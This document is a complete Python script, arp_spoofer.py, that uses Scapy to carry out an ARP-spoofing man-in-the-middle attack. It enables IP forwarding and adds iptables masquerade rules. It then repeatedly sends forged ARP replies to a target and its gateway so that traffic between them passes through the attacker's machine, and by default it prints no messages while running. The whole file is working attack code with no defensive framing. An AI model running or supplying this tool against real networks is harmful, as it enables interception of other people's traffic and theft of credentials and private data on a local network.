# arp_spoofer.py

import logging
# Silence Scapy runtime warnings (including missing Ethernet dst MAC)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import scapy.all as scapy
import subprocess
import time
import sys
import os

def enable_ip_forwarding():
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)

def setup_iptables(interface):
    subprocess.call(["iptables", "-A", "FORWARD", "-i", interface, "-j", "ACCEPT"])
    subprocess.call(["iptables", "-A", "FORWARD", "-o", interface, "-j", "ACCEPT"])
    subprocess.call(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", interface, "-j", "MASQUERADE"])

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    answered = scapy.srp(broadcast / arp_request, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc if answered else None

def spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not find MAC for {target_ip}")
        return
    attacker_mac = scapy.get_if_hwaddr(interface)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    if not dest_mac or not src_mac:
        print(f"[!] Could not find MAC for restoring {dest_ip} or {src_ip}")
        return
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

def run_spoofer(target_ip, gateway_ip, interface, quiet=True):
    enable_ip_forwarding()
    setup_iptables(interface)

    # Only print this banner if quiet==False
    if not quiet:
        print(f"[+] Spoofing {target_ip} <--> {gateway_ip} ... Press CTRL+C to stop.")

    sent = 0
    try:
        while True:
            spoof(target_ip, gateway_ip, interface)
            spoof(gateway_ip, target_ip, interface)
            sent += 2
            if not quiet and sent % 10 == 0:
                print(f"[+] Packets sent: {sent}")
            time.sleep(2)
    except KeyboardInterrupt:
        if not quiet:
            print("\n[+] Stopping spoof. Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        if not quiet:
            print("[+] ARP tables restored.")
